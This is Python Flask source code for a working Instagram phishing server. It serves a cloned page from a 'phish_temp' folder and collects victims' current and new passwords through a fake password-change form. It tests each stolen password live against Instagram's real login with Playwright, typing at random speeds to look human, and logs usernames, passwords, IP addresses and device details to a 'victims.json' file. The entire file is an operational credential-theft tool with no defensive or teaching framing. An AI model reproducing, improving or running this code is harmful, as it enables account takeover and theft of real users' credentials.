from flask import Flask, request, jsonify, send_from_directory
from playwright.sync_api import sync_playwright
import sys
import requests
import json
import os
from datetime import datetime
import random

app = Flask(__name__)

BASE_DIR = os.getcwd()
PHISH_DIR = os.path.join(BASE_DIR, "assets", "phish_temp")
LOG_FILE = os.path.join(BASE_DIR, "victims.json")

def check_instagram_login(username, password):
    print(f"\n[DEBUG] Starting Authentication for: {username}")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False) 
        context = browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        
        try:
            page.goto("https://www.instagram.com/accounts/login/", wait_until="networkidle", timeout=60000)
            user_selector = 'input[name="username"], input[aria-label*="Phone"], input[aria-label*="username"], input[placeholder*="username"], input[name="email"]'
            pass_selector = 'input[name="password"], input[aria-label*="Password"], input[placeholder*="Password"], input[name="pass"]'

            print("[*] Locating login fields...")
            page.wait_for_selector(user_selector, state="visible", timeout=15000)
            u_field = page.locator(user_selector).first
            u_field.click()
            for char in username:
                page.keyboard.type(char, delay=random.randint(40, 120))
            p_field = page.locator(pass_selector).first
            p_field.click()
            for char in password:
                page.keyboard.type(char, delay=random.randint(40, 120))
            page.wait_for_timeout(800)
            print("[*] Submitting...")
            page.keyboard.press("Enter")
            page.wait_for_timeout(10000) 
            final_url = page.url
            page.screenshot(path="auth_result.png")
            is_valid = "login" not in final_url or "two_factor" in final_url
            print(f"[*] Auth Finished. URL: {final_url} | Success: {is_valid}")
            return is_valid
                
        except Exception as e:
            print(f"[!] Playwright Error: {e}")
            page.screenshot(path="selector_error.png")
            return False
        finally:
            browser.close()

@app.route('/')
def serve_index():
    return send_from_directory(PHISH_DIR, 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory(PHISH_DIR, path)

@app.route('/login', methods=['POST'])
def login():
    target_username = get_target_from_json()
    if not target_username:
        return jsonify({"status": "error", "message": "Target not found in database."})

    current_password = request.form.get('old_password')
    new_password = request.form.get('new_password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    platform = "PC"
    if "iPhone" in user_agent: platform = "iPhone"
    elif "Android" in user_agent: platform = "Android"
    elif "Windows" in user_agent: platform = "Windows"
    is_valid = check_instagram_login(target_username, current_password)
    status = "SUCCESS" if is_valid else "FAILED"

    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr

    real_ip = get_client_ip()
    log_data(target_username, current_password, new_password, "SUCCESS", real_ip, platform, user_agent)

    if is_valid:
        return jsonify({"status": "success", "redirect": "https://www.instagram.com"})
    else:
        return jsonify({"status": "error", "message": "Invalid password. Please try again."})
    
def get_client_ip():
    headers_to_check = ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP']
    ip = request.remote_addr
    
    for header in headers_to_check:
        value = request.headers.get(header)
        if value:
            ip = value.split(',')[0].strip()
            break
    if ":" in ip:
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=2)
            return response.json()['ip']
        except:
            return ip
    return ip

def log_data(u, cp, np, status, ip, plat, brow):
    victims = {}
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                victims = json.load(f)
        except: victims = {}
    victims[u] = {
        "username": u,
        "current_pass": cp,
        "new_pass": np,
        "ip": ip,
        "platform": plat,
        "browser": brow[:50] + "...",
        "status": status,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(LOG_FILE, "w") as f:
        json.dump(victims, f, indent=4)

def get_target_from_json():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            try:
                victims = json.load(f)
                return list(victims.keys())[-1] if victims else None
            except: return None
    return None

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    app.run(host='127.0.0.1', port=port)
